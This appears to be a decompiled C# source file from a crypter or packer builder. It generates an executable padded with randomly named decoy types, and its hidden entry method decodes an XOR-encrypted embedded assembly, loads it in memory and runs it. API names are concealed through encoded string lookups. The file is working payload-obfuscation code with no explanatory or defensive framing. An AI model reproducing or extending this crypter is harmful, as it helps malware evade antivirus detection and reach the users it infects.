using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

public static class DynamicIlEmitter
{
	internal static readonly Random random = new Random();

	internal static readonly Type[] typeArray = new Type[10]
	{
		typeof(void),
		typeof(int),
		typeof(uint),
		typeof(long),
		typeof(ulong),
		typeof(short),
		typeof(ushort),
		typeof(float),
		typeof(double),
		typeof(bool)
	};

	internal static void EmitEmbeddedAssemblyLoader(ILGenerator ilGenerator, byte[] assemblyBytes)
	{
		byte b = (byte)DynamicIlEmitter.random.Next(1, 256);
		StringBuilder stringBuilder = new StringBuilder(assemblyBytes.Length);
		for (int i = 0; i < assemblyBytes.Length; i++)
		{
			stringBuilder.Append((char)(assemblyBytes[i] ^ b));
		}
		string str = stringBuilder.ToString();
		LocalBuilder encodedText = ilGenerator.DeclareLocal(typeof(string));
		LocalBuilder decodedBytes = ilGenerator.DeclareLocal(typeof(byte[]));
		LocalBuilder index = ilGenerator.DeclareLocal(typeof(int));
		LocalBuilder arguments = ilGenerator.DeclareLocal(typeof(object[]));
		Label loopCondition = ilGenerator.DefineLabel();
		Label loopBody = ilGenerator.DefineLabel();
		ilGenerator.Emit(OpCodes.Ldstr, str);
		ilGenerator.EmitStoreLocal(encodedText);
		ilGenerator.EmitLoadLocal(encodedText);
		ilGenerator.Emit(OpCodes.Callvirt, DynamicIlEmitter.GetMethod(typeof(string), EncodedStringTable.DecodeString(24)));
		ilGenerator.Emit(OpCodes.Newarr, typeof(byte));
		ilGenerator.EmitStoreLocal(decodedBytes);
		ilGenerator.Emit(OpCodes.Ldc_I4_0);
		ilGenerator.EmitStoreLocal(index);
		ilGenerator.Emit(OpCodes.Br_S, loopCondition);
		ilGenerator.MarkLabel(loopBody);
		ilGenerator.EmitLoadLocal(decodedBytes);
		ilGenerator.EmitLoadLocal(index);
		ilGenerator.EmitLoadLocal(encodedText);
		ilGenerator.EmitLoadLocal(index);
		ilGenerator.Emit(OpCodes.Callvirt, DynamicIlEmitter.GetMethod(typeof(string), EncodedStringTable.DecodeString(41)));
		ilGenerator.Emit(OpCodes.Ldc_I4_S, b);
		ilGenerator.Emit(OpCodes.Xor);
		ilGenerator.Emit(OpCodes.Conv_U1);
		ilGenerator.Emit(OpCodes.Stelem_I1);
		ilGenerator.EmitLoadLocal(index);
		ilGenerator.Emit(OpCodes.Ldc_I4_1);
		ilGenerator.Emit(OpCodes.Add);
		ilGenerator.EmitStoreLocal(index);
		ilGenerator.MarkLabel(loopCondition);
		ilGenerator.EmitLoadLocal(index);
		ilGenerator.EmitLoadLocal(encodedText);
		ilGenerator.Emit(OpCodes.Callvirt, DynamicIlEmitter.GetMethod(typeof(string), EncodedStringTable.DecodeString(24)));
		ilGenerator.Emit(OpCodes.Blt_S, loopBody);
		ilGenerator.EmitLoadLocal(decodedBytes);
		ilGenerator.Emit(OpCodes.Call, DynamicIlEmitter.GetMethod(typeof(Assembly), EncodedStringTable.DecodeString(54), new Type[]
		{
			typeof(byte[])
		}));
		ilGenerator.Emit(OpCodes.Callvirt, DynamicIlEmitter.GetMethod(typeof(Assembly), EncodedStringTable.DecodeString(63)));
		ilGenerator.Emit(OpCodes.Ldnull);
		ilGenerator.Emit(OpCodes.Ldc_I4_1);
		ilGenerator.Emit(OpCodes.Newarr, typeof(object));
		ilGenerator.Emit(OpCodes.Stloc, arguments);
		ilGenerator.Emit(OpCodes.Ldloc, arguments);
		ilGenerator.Emit(OpCodes.Ldc_I4_0);
		ilGenerator.Emit(OpCodes.Ldarg_0);
		ilGenerator.Emit(OpCodes.Stelem_Ref);
		ilGenerator.Emit(OpCodes.Ldloc, arguments);
		ilGenerator.Emit(OpCodes.Callvirt, DynamicIlEmitter.GetMethod(typeof(MethodBase), EncodedStringTable.DecodeString(84), new Type[]
		{
			typeof(object),
			typeof(object[])
		}));
		ilGenerator.Emit(OpCodes.Pop);
		ilGenerator.Emit(OpCodes.Ret);
	}

	internal static void EmitLoadLocal(this ILGenerator ilGenerator, LocalBuilder local)
	{
		ilGenerator.Emit(OpCodes.Ldloc, local);
	}

	internal static void EmitStoreLocal(this ILGenerator ilGenerator, LocalBuilder local)
	{
		ilGenerator.Emit(OpCodes.Stloc, local);
	}

	public static void BuildExecutable(byte[] assemblyBytes, string outputPath, PEFileKinds fileKind)
	{
		AssemblyName assemblyName = new AssemblyName(RecoveredRuntime.GenerateRandomIdentifier());
		AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Save);
		ModuleBuilder moduleBuilder_ = assemblyBuilder.DefineDynamicModule(assemblyName.Name, assemblyName.Name + ".exe");
		int num = DynamicIlEmitter.random.Next(5, 30);
		int num2 = DynamicIlEmitter.random.Next(num);
		MethodBuilder methodBuilder = null;
		for (int i = 0; i < num; i++)
		{
			TypeBuilder typeBuilder = RecoveredRuntime.DefineDecoyType(moduleBuilder_);
			if (num2 == i)
			{
				methodBuilder = typeBuilder.DefineMethod(RecoveredRuntime.GenerateRandomIdentifier(), MethodAttributes.FamANDAssem | MethodAttributes.Family | MethodAttributes.Static, typeof(void), new Type[]
				{
					typeof(string[])
				});
				DynamicIlEmitter.EmitEmbeddedAssemblyLoader(methodBuilder.GetILGenerator(), assemblyBytes);
				methodBuilder.SetCustomAttribute(new CustomAttributeBuilder(DynamicIlEmitter.GetConstructor(typeof(STAThreadAttribute), new Type[0]), new object[0]));
			}
			typeBuilder.CreateType();
		}
		assemblyBuilder.SetEntryPoint(methodBuilder, fileKind);
		assemblyBuilder.Save(assemblyName.Name + ".exe");
		File.Move(assemblyName.Name + ".exe", outputPath);
	}

	internal static MethodInfo GetMethod(Type type, string methodName)
	{
		return type.GetMethod(methodName);
	}

	internal static MethodInfo GetMethod(Type type, string methodName, Type[] parameterTypes)
	{
		return type.GetMethod(methodName, parameterTypes);
	}

	internal static ConstructorInfo GetConstructor(Type type, Type[] parameterTypes)
	{
		return type.GetConstructor(parameterTypes);
	}
}
